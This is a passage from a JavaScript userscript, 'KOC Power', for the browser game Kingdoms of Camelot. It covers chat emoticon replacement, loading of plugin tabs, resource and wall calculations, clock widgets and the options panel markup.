	msg = msg.replace(':-)', '<img height=50% width=50% class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace(':)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace(':=)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');		msg = msg.replace('^^', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\">');
	msg = msg.replace(':=(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\">');		msg = msg.replace(':-(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\">');
	msg = msg.replace(':D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">');	msg = msg.replace(':-D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">');		msg = msg.replace(':=D', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\">'); 
	msg = msg.replace(';-(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\">');		msg = msg.replace(';=(', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\">'); 	
	msg = msg.replace(';-)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\">');		msg = msg.replace(';=)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\">');	
	msg = msg.replace(':-*', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\">');		msg = msg.replace(':=*', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\">');	
	msg = msg.replace(':^)', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00112-wondering.gif\">');	
	msg = msg.replace('<3', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/heart.png\">');
	msg = msg.replace("I=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');	msg = msg.replace("I-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');		msg = msg.replace("|-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\">');	
	msg = msg.replace("8-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("8=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("B-)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">');		msg = msg.replace("B=)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\">'); 	
	msg = msg.replace("(ci)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');		msg = msg.replace("(smoke)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');    msg = msg.replace("(rauchen)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');	msg = msg.replace("(smoking)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\">');	
	msg = msg.replace("(fubar)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00181-fubar.gif\">');	
	msg = msg.replace(":-&", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\">');		msg = msg.replace(":=&", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\">');	
	msg = msg.replace(">:)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\">');		msg = msg.replace("]:)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\">');	
	msg = msg.replace("(:|", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00107-sweating.gif\">');	
	msg = msg.replace('(glory)', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\">');
	msg = msg.replace('(fight)', '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\">');
	msg = msg.replace(":P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">'); 	msg = msg.replace(":=P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">'); 	msg = msg.replace(":P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');	msg = msg.replace(":-P", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');		msg = msg.replace(":=p", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\">');	
	msg = msg.replace(":-$", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');		msg = msg.replace(":=$", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');		msg = msg.replace(':">', '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\">');	
	msg = msg.replace("(party)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00123-party.gif\">');		msg = msg.replace("(like)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/like.gif\">');	msg = msg.replace("(dontlike)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/dontlike.gif\">');	
	msg = msg.replace("(bug)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/bug.gif\">');	msg = msg.replace("(pool)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/poolparty.gif\">');		msg = msg.replace("(bandit)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_bandit.gif\">');		msg = msg.replace("(drunk)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_drunk.gif\">');		msg = msg.replace("(finger)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_finger.gif\">');		msg = msg.replace("(headbang)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_headbang.gif\">');		msg = msg.replace("(mooning)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_mooning.gif\">');		msg = msg.replace("(rock)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_rock.gif\">');		msg = msg.replace("(swear)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/swear.gif\">');	msg = msg.replace("(tmi)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/tmi.gif\">');		msg = msg.replace("(toivo)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_toivo.gif\">');		msg = msg.replace("(bow)", '<img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype-wackyb-0139-1-bow.gif\">');   	msg = msg.replace("(ninja)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00170-ninja.gif\">');		msg = msg.replace("(beer)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00167-beer.gif\">');		msg = msg.replace("(drink)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00168-drink.gif\">');		msg = msg.replace("(muscle)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00165-muscle.gif\">');	msg = msg.replace("(cafe)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(kaffee)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(coffee)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\">');	msg = msg.replace("(pizza)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00163-pizza.gif\">');		msg = msg.replace("(music)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00159-music.gif\">');		msg = msg.replace("(inlove)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00115-inlove.gif\">');	
	msg = msg.replace("x=(", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');			msg = msg.replace("x-(", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');	msg = msg.replace(":-@", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');			msg = msg.replace(":=@", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\">');	
	msg = msg.replace("(clap)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');	msg = msg.replace("(bravo)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');	msg = msg.replace("(klatschen)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\">');
	msg = msg.replace("(punch)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00146-punch.gif\">');		msg = msg.replace("(yes)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00148-yes.gif\">');		msg = msg.replace("(handshake)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00150-handshake.gif\">');		msg = msg.replace("(no)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00149-no.gif\">');	msg = msg.replace("(rofl)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00140-rofl.gif\">');		msg = msg.replace("(flower)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00155-flower.gif\">');		msg = msg.replace("(phone)", '<img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00161-phone.gif\">');
	msg = msg.replace("(pdx)", '<img class=emoicon src=\"'+EMOpdx+'\">');	msg = msg.replace("(ksx)", '<img class=emoicon src=\"'+EMOpdx+'\">');			msg = msg.replace("(nessaja)", '<img class=emoicon src=\"'+EMOpdx+'\">');			msg = msg.replace("(jontey)", '<img class=emoicon src=\"'+EMOpdx+'\">');
	}  
	//WHISPER SOUND
	   if (whisp.indexOf(''+culang.whispertou+'') >= 0 && Options.WhisperOn) {
       if (whisp.indexOf(''+culang.saytoalli+'') < 0) 
	   msg +='<span id"whispersound"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson1vol +'" /></object></span>';
       }

       return msg;
   },
}
/********************************************************************************
* 					KOC POWER - REPORT HOTLINK 									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_RPTHOTLINK' ));
/********************************************************************************
* 					KOC POWER - DELETE REPORTS									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_RPTDELETE' ));
/********************************************************************************
* 						KOC POWER - FOOD ALERT 									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_FOODALERT' ));
/********************************************************************************
* 						KOC POWER - TABS START									*
********************************************************************************/

/********************************************************************************
* 						KOC POWER - TABS OVERVIEW 								*	
********************************************************************************/
function getResourceProduction (cityId){
  var ret = [0,0,0,0,0];
  var now = unixTime ();
  var search='type==10 || type==11';
  var wilds = [0, 0, 0, 0, 0];
  var w = Seed.wilderness["city" + cityId];
  for (var k in w){
    var type = parseInt(w[k].tileType);

    if (type==10 || type==11)
	      wilds[1] += parseInt(w[k].tileLevel);
	    else 
	      wilds[type/10] += parseInt(w[k].tileLevel);
  }  
  knight = 0;       
  var s = Seed.knights["city" + cityId];
  if (s) {
    s = s["knt" + Seed.leaders["city" + cityId].resourcefulnessKnightId];
    if (s){
      var knight = parseInt(s.resourcefulness);
      if (s.resourcefulnessBoostExpireUnixtime > now)
        knight *= 1.25;
    }
  }
  var workerFactor = 1;
  var c = parseInt(Seed.citystats["city" + cityId]["pop"][0]);  // Current  population
  var w = parseInt(Seed.citystats["city" + cityId]["pop"][3]);  // Labor force
  if (w > c)
    workerFactor = c / w;
  
  for (var i=1; i<5; i++){
    var usage = Seed.resources["city" + cityId]["rec" + i];
    var items = 0;
    if (parseInt(Seed.playerEffects["r" + i + "BstExp"]) > now) {
      items = 0.25;
    }
    var tech = Seed.tech["tch" + i];
    ret[i] = parseInt((usage[2] * (1 + tech/10 + knight/100 + items + 0.05 * wilds[i]) * workerFactor + 100));
  }
  return ret;  
}

if(!false) eval(GM_getResourceText( 'TABS_OVERVIEW' ));

function getWallInfo (cityId, objOut){
	objOut.wallSpaceUsed = 0;
	objOut.fieldSpaceUsed = 0;
	objOut.wallLevel = 0;
	objOut.wallSpace = 0;
	objOut.fieldSpace = 0;
	objOut.Crossbows = 0;
	objOut.CrossbowsTraining = 0;
	objOut.Trebuchet = 0;
	objOut.TrebuchetTraining = 0;
	objOut.Caltrops = 0;
	objOut.CaltropsTraining = 0;
	objOut.SpikedBarrier = 0;
	objOut.SpikedBarrierTraining = 0;
	objOut.Trap = 0;
	objOut.TrapTraining = 0;
	objOut.slotsBusy = 0;
	var b = Seed.buildings["city" + cityId];
	if (b.pos1==null)
		return;
	objOut.wallLevel = parseInt(b.pos1[1]);
	var spots = 0;
	for (var i=1; i<(objOut.wallLevel+1); i++)
		spots += (i * 500);
	objOut.wallSpace = spots;
	objOut.fieldSpace = spots;

	var fort = Seed.fortifications["city" + cityId];
	for (k in fort){
		var id = parseInt(k.substr(4));
		if (id == 53)
			objOut.Crossbows = parseInt(fort[k]);
		else if (id == 55)
			objOut.Trebuchet = parseInt(fort[k]);
		else if (id == 60)
			objOut.Trap = parseInt(fort[k]);
		else if (id == 61)
			objOut.Caltrops = parseInt(fort[k]);
		else if (id == 62)
			objOut.SpikedBarrier = parseInt(fort[k]);
		if (id<60)
			objOut.wallSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
		else
			objOut.fieldSpaceUsed += parseInt(unsafeWindow.fortstats["unt"+ id][5]) * parseInt(fort[k]);
	}
	var q = Seed.queue_fort["city"+cityId];
	if (q && q.length>0) {
		for (qi=0; qi<q.length; qi++) {
			objOut.slotsBusy++;
			if (q[qi][0]==53)
				objOut.CrossbowsTraining += parseInt(q[qi][1]);
			if (q[qi][0]==55)
				objOut.TrebuchetTraining += parseInt(q[qi][1]);
			if (q[qi][0]==60)
				objOut.TrapTraining += parseInt(q[qi][1]);
			if (q[qi][0]==61)
				objOut.CaltropsTraining += parseInt(q[qi][1]);
			if (q[qi][0]==62)
				objOut.SpikedBarrierTraining += parseInt(q[qi][1]);
		}
	}
}
/********************************************************************************
* 						KOC POWER - TABS INVENTAR 								*
********************************************************************************/
if(!StyleOptions.disInvTab) eval(GM_getResourceText( 'TABS_INVENTORY' ));
/********************************************************************************
* 						KOC POWER - TABS BUILD 									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_BUILD' ));
/********************************************************************************
*					 KOC POWER - TABS AUTO SCOUT 								*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_AUTOSCOUT' ));
/********************************************************************************
* 						KOC POWER - TABS TRAIN 									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_TRAIN' ));
/********************************************************************************
* 						KOC POWER - TABS SEARCH 								*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_SEARCH' ));
/********************************************************************************
* 						KOC POWER - Export to KOC Attack						*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_EXPORTKOCATTACK' ));

	  function searchDOM (node, condition, maxLevel, doMult){
		var found = [];
		eval ('var compFunc = function (node) { return ('+ condition +') }');
		doOne(node, 1);
		if(!doMult){
		  if (found.length==0)
			return null;
		  return found[0];
		}
		return found;
		function doOne (node, curLevel){
		  try {
			if (compFunc(node))
			  found.push(node);
		  } catch (e){
		  }      
		  if (!doMult && found.length>0)
			return;
		  if (++curLevel<maxLevel && node.childNodes!=undefined)
			for (var c=0; c<node.childNodes.length; c++)
			  doOne (node.childNodes[c], curLevel);
		}
	  }
/********************************************************************************
*						KOC POWER - TABS PLAYER 								*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_PLAYER' ));
/************************************************************************************
*						KOC POWER - TABS GIFTS 										*
************************************************************************************/
function explodeUrlArgs (url){
  var i = url.indexOf ('?');
  var a = url.substr(i+1).split ('&');
  var args = {};
  for (i=0; i<a.length; i++){    var s = a[i].split ('=');    args[s[0]] = s[1];  }
  return args;
}
// returns: page text or null on comm error
function GM_AjaxPost (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxPost ('+ label +'): ' + url +'\n'+ inspect (args, 5, 1));
  GM_xmlhttpRequest({
    method: "post",
    url: url,
    data: implodeUrlArgs(args),
    headers: { "Content-Type": "application/x-www-form-urlencoded", 'X-Requested-With': 'XMLHttpRequest', 'X-Prototype-Version': '1.6.1', 'Accept': 'text/javascript, text/html, application/xml, text/xml, */*' },
    onload: function (rslt) { if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxPost.onLoad ('+ label +'):\n '  + inspect (rslt, 6, 1)); notify (rslt.responseText); },
    onerror: function () { notify (null); },
  });
}
// returns: page text or null on comm error
function GM_AjaxGet (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxGet ('+ label +'): ' + url);
  GM_xmlhttpRequest({
    method: "get",
    url: addUrlArgs(url, args),
    onload: function (rslt) { if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxGet.onLoad ('+ label +')  len='+ rslt.responseText.length +':\n '  + inspect (rslt, 6, 1)); notify (rslt.responseText); },
    onerror: function () { notify (null); },
  });
}         
 if(!false) eval(GM_getResourceText( 'TABS_GIFT' ));
/************************************************************************************
*						KOC POWER - TABS KNIGHTS									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_KNIGHT' ));
/************************************************************************************
*						KOC POWER - TABS AUTO CRAFT									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_AUTOCRAFT' ));
/************************************************************************************
*						KOC POWER - TABS WILDS 										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_WILD' ));
/************************************************************************************
*						KOC POWER - TABS OPTIONS									*
************************************************************************************/
if (Options.pdxTimeZones=="noneTimeZone") { var noTimeZone = { init : function () {  var t = noTimeZone;  }, } }			 
if (Options.pdxTimeZones=="gmtTimeZone") { var gmtClock = {  span : null,  timer : null,  init : function (){  var t = gmtClock;    t.span = document.createElement ('span');    t.span.style.fontWeight = 'bold';	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);    t.setEnable (Options.pdxTimeZones=="gmtTimeZone");  },
  setEnable : function (tf){    var t = gmtClock;    clearInterval (t.timer);    if (tf){      t.timer = setInterval (t.everySecond, 900);    } else {      t.span.innerHTML = '';    }  },
  everySecond : function (){ var t = gmtClock;    var now = new Date();      now.setTime(now.getTime() + (now.getTimezoneOffset()*60000));    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';  },
 }
}
if (Options.pdxTimeZones=="pstTimeZone") { var pstClock = {  span : null,  timer : null,  init : function (){  var t = pstClock;    t.span = document.createElement ('span');    t.span.style.fontWeight = 'bold';	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);    t.setEnable (Options.pdxTimeZones=="pstTimeZone");  },
  setEnable : function (tf){ var t = pstClock;    clearInterval (t.timer);    if (tf){      t.timer = setInterval (t.everySecond, 900);    } else {      t.span.innerHTML = '';    }  }, 
  everySecond : function (){ var t = pstClock;    var now = new Date();      now.setTime(now.getTime() + (now.getTimezoneOffset()*540000));    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';  },
} }
if (Options.pdxTimeZones=="cestTimeZone") { var cestClock = {  span : null,  timer : null,    init : function (){  var t = cestClock;    t.span = document.createElement ('span');    t.span.style.fontWeight = 'bold';	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);    t.setEnable (Options.pdxTimeZones=="cestTimeZone");  },
  setEnable : function (tf){    var t = cestClock;    clearInterval (t.timer);    if (tf){      t.timer = setInterval (t.everySecond, 900);    } else {      t.span.innerHTML = '';    }  },
  everySecond : function (){  var t = cestClock;    var now = new Date();      now.setTime(now.getTime() + (now.getTimezoneOffset()*0));    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';  },
} }
if (Options.pdxTimeZones=="estTimeZone") { var estClock = {  span : null,  timer : null,  init : function (){  var t = estClock;    t.span = document.createElement ('span');    t.span.style.fontWeight = 'bold';	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);    t.setEnable (Options.pdxTimeZones=="estTimeZone");  },
  setEnable : function (tf){    var t = estClock;    clearInterval (t.timer);    if (tf){      t.timer = setInterval (t.everySecond, 900);    } else {      t.span.innerHTML = '';    } },
  everySecond : function (){  var t = estClock;    var now = new Date();      now.setTime(now.getTime() + (now.getTimezoneOffset()*180000));    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';  },
} }

Tabs.Options = {
  tabLabel : culang.options,
  tabOrder: StyleOptions.toEinstellung,
  myDiv : null,
  fixAvailable : {},
  displayTimer:null,
  curTabBut : null,
  curTabName : null,

  init : function (div){
    var t = Tabs.Options;
	
	var chat = document.getElementById('kocmain_bottom').childNodes[1];
	 if (chat) {
	 var channel_input = nHtml.FindByXPath(chat,".//div[contains(@class,'mod_comm_forum')]");
	 logit(channel_input);
	 var ab = document.createElement('a');
	 ab.className="mod_comm_set";
	 channel_input.appendChild(ab);
	 ab.innerHTML=""+culang.Osmileys+"";
		
	 ab.addEventListener ('click', function() {
	 t.EmoHelp();
	 }, false);
}

    t.myDiv = div;
	t.myDiv.style.overflowY = 'auto';
    t.myDiv.innerHTML = '<div class=pdxStat>KOC POWER - '+culang.Hsettings+'</div>	<TABLE class=pdxTab align=center><TR><TD>	<INPUT class=pdxSubtab ID=ptmrchSubO type=submit  value=Power></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubN type=submit   value=Bot></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubT type=submit   value=Tools></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubS type=submit   value=Style></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubC type=submit   value=Colors></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubL type=submit   value=Layout></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubTabs type=submit   value=Tabs></td>			<TD><INPUT class=pdxSubtab ID=ptmrchSubPlayers type=submit   value=Players></td>		<TD><INPUT class=pdxSubtab ID=ptmrchSubP type=submit   value=Position></td>	<TD><INPUT class=pdxSubtab ID=ptmrchSubAvatars type=submit   value=Avatar></td><TD><INPUT class=pdxSubtab ID=ptmrchSubX type=submit   value=Links></td></tr>\
	</table><DIV id=ptOptionsOutput style=" "></div>';
    t.optionsDiv = document.getElementById('ptOptionsOutput');
    document.getElementById('ptmrchSubO').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubT').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubN').addEventListener('click', e_butSubtab, false);
    document.getElementById('ptmrchSubS').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubL').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubTabs').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubPlayers').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubP').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubC').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubAvatars').addEventListener('click', e_butSubtab, false);
	document.getElementById('ptmrchSubX').addEventListener('click', e_butSubtab, false);
	
    changeSubtab (document.getElementById('ptmrchSubO'));

    function e_butSubtab (evt){
      changeSubtab (evt.target);
    }

    function changeSubtab (but){
      if (but == t.curTabBut)
        return;
      if (t.curTabBut){
        t.curTabBut.className='pdxSubtab';
        t.curTabBut.disabled=false;
      }
      t.curTabBut = but;
      but.className='pdxSubtab pdxSubtabSel';
      but.disabled=true;
      t.curTabName = but.id.substr(9);
      t.show ();
    }
  },

  hide : function (){
    var t = Tabs.Options;
    clearTimeout (t.displayTimer);
      mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.PopUpWidth + 'px';
  },

  show : function (){
    var t = Tabs.Options;
    clearTimeout (t.displayTimer);
      mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.PopUpWidth + 'px';
    if (t.curTabName == 'T')
      t.showTools();
    else if (t.curTabName == 'N')
      t.showBot();
    else if (t.curTabName == 'S')
      t.showStyle();
	else if (t.curTabName == 'L')
      t.showLayoutWallpaper();
    else if (t.curTabName == 'Avatars')
      t.showAvatars();
    else if (t.curTabName == 'X')
      t.showXtrLink();
	else if (t.curTabName == 'P')
      t.showPosition();
	else if (t.curTabName == 'C')
      t.showColors();
	else if (t.curTabName == 'Tabs')
      t.showTabs();	
	else if (t.curTabName == 'Players')
      t.showPlayers();
    else
      t.showOptions();

  },
// OPTIONS SUBTAB { POWER }
   showOptions : function (){
    var t = Tabs.Options;

    try {
	var m = '<DIV style=" max-height:530px;">';
	m += '<TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
		<TR><TD colspan=2><div class=pdxStat>KOC POWER - '+culang.Hsettings+'</div></td></tr>\
		<TR><TD width="10"><INPUT id=pbEveryEnable type=checkbox '+ (Options.pbEveryEnable?'CHECKED ':'') +'/></td><TD width="958">'+culang.OpbEveryEnable+' \
		<INPUT id=pbeverymins type=text size=2 maxlength=3 \> '+culang.OpbEveryEnable2+'</td></tr>\
		<TR><TD><INPUT id=pdxSessionRefresh type=checkbox  '+ (Options.sessionRefresh?'CHECKED ':'') +' /></td><TD>'+culang.OsessionRefresh+'</td></tr>\
		<TR><TD><INPUT id=pballowWinMove type=checkbox /></td><TD>'+culang.OpballowWinMove+'</td></tr>\
		<TR><TD><INPUT id=pbTrackWinOpen type=checkbox /></td><TD>'+culang.OpbTrackWinOpen +'</td></tr>\
		<TR><TD><INPUT id=pdxTournamentCheck type=checkbox '+ (Options.enableCheckTournament?'CHECKED ':'') +'/></td><TD> '+culang.chkTournament+'</td></tr>\
		<TR><TD><INPUT id=togSmiley type=checkbox /></td><TD>'+culang.Osmileys+' <INPUT id=EmoHelp type=submit value="'+culang.helpbutton+'"></td></tr>\
		<TR><TD><INPUT id=pbHideOnGoto type=checkbox /></td><TD>'+culang.OpbHideOnGoto +'</td></tr>\
		<TR><TD></td><TD>'+culang.fileServer+' '+ htmlSelector({kocscripts:''+culang.kocscripts+'', kocscripts2:''+culang.kocscripts+' #2', googlecode:''+culang.gcode+''},Options.pdxSourceSever,'id=pdxSourceSever') +'</td></tr>\
		<TR><TD></td><TD>'+culang.soundFileServer+'  '+ htmlSelector({kocscripts:''+culang.kocscripts+'', kocscripts2:''+culang.kocscripts+' #2'},Options.pdxSoundSourceSever,'id=pdxSoundSourceSever') +'</td></tr>\
		<TD><INPUT id=pdxwidescreenEnable type=checkbox '+ (Options.widescreen?'CHECKED ':'') +'/></td><TD>'+culang.OpdxwidescreenEnable+'</td></tr>\
		<TR><TD><INPUT id=togForceMarchUpdates type=checkbox /></td><TD>'+culang.OtogForceMarchUpdates +' <b>(<span class=boldRed>'+culang.OtogForceMarchUpdatesImp+'</span>)</b></td></tr>\
		<TR><TD><INPUT id=pbupdate type=checkbox '+ (GlobalOptions.pbupdate?'CHECKED ':'') +'/></td><TD>'+culang.Oupd+' '+ htmlSelector({0:''+culang.Oupduserscripts+'', 1:''+culang.OupdgooglecodeBeta+''},GlobalOptions.pbupdatebeta,'id=pbupdatebeta') +' - <INPUT id=pbupdatenow type=submit value="'+culang.updNow+'" /> <b>(<span class=boldRed>'+culang.alldomains+'</span>)</b> '+culang.updnow+' <a href="http://userscripts.org/scripts/source/104137.user.js" target="_blank" title="'+culang.OinstUR+'">'+culang.rlsversion+'</a> | <a href="http://koc-power-pdx.googlecode.com/svn/trunk/koc_power_pdx.user.js" target="_blank" title="'+culang.OinstBT+'">'+culang.beta+'</a></td></tr>\
		<TR><TD colspan=2><div class=pdxStat>'+culang.HLang+'</div></td></tr>\
		<TD colspan=2>'+culang.OLang+' <br><b>(</b><span class=boldRed>'+culang.OLangImp+'</span><b>)</b></td></tr>\
		<TD></TD><TD><B>'+culang.pack+'</B>:\
		<select id=pbLang '+(LangOptions.culang==0?'DISABLED':'')+'/><option value=0 >-- '+culang.select+' --</option>';
		for (var i in LangOptions.langpacks) {
		if(i == LangOptions.culang)
			m += '<option value="'+i+'" selected="selected">'+i+'</option>'; // Load Previous langpack Selection
		else
			 m += '<option value="'+i+'">'+i+'</option>';
		};
		m += '</select><b> '+culang.scriptv+'</b>: <span class=boldRed>'+LangVersion+'</span> <INPUT id=pbupdatelanglist type=submit value='+langpack.updatelangbtn+'>\
